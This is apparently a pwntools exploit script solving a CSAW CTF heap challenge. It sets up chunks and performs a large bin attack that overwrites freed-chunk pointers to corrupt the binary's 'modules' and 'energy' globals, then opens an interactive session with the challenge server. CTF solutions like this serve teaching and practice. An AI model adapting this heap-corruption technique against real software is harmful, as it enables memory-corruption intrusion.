from pwn import *

enc = lambda a: a.encode() if isinstance(a, str) else a
sla = lambda a, b: r.sendlineafter(enc(a), enc(b))
snl = lambda a: r.sendline(enc(a))
sna = lambda a, b: r.sendafter(enc(a), enc(b))
snd = lambda a: r.send(enc(a))
rcu = lambda a: r.recvuntil(enc(a), drop=True)
rcv = lambda a: r.recv(enc(a))
rcl = lambda: r.recvline()
p24 = lambda a: p32(a)[:-1]
l64 = lambda a: u64(a.ljust(8, b"\x00"))
l32 = lambda a: u64(a.ljust(4, b"\x00"))
l16 = lambda a: u64(a.ljust(2, b"\x00"))
lin = lambda a: log.info(f"{hex(a)=}")
sen = lambda a: str(a).encode()
mangle = lambda ptr, pos: ptr ^ (pos >> 12)

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./chal_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

serv = "chals.ctf.csaw.io"
port = 21005

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        cmd = [exe.path]
        r = process(cmd)
        if args.GDB:
            gdb.attach(r, gdbscript="""
            """)
    return r

r = conn()


def malloc(index: int, size: int, data: bytes):
    sla(b'>> ', b'1')
    sla(b'Index: ', sen(index))
    sla(b'Size: ', sen(size))
    sla(b'Data: ', data)

def free(index: int):
    sla(b'>> ', b'2')
    sla(b'Index: ', sen(index))

def write(index: int, data: bytes):
    sla(b'>> ', b'3')
    sla(b'Index: ', sen(index))
    sla(b'Data: ', data)

def main():

    malloc(0, 0x1018, b'bruh')
    malloc(1, 0x1008, b'bruh') # Barrier chunk
    malloc(2, 0x1008, b'bruh')
    malloc(3, 0x1008, b'bruh') # Barrier chunk

    # Large bin attack
    free(0)
    malloc(4, 0x1028, b'bruh')
    free(2)
    write(0, p64(exe.sym.modules + 4 * 0x8) * 2 + p64(0x0) + p64(exe.sym.energy - 4 * 0x8))
    malloc(5, 0x1028, b'bruh')

    sla(b'>> ', b'4')

    r.interactive()

if __name__ == "__main__":
    main()